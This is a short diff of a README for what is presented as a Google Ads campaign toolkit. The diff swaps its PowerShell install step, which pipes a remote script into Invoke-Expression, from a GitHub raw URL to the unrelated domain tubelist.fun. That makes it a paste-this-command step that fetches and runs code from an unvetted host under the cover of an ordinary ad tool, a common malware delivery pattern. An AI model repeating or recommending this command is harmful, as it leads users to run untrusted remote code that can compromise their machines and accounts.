@@ -3,7 +3,7 @@
 Toolkit for managing Google Ads campaigns with automated bidding and keyword optimization.
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ## Capabilities
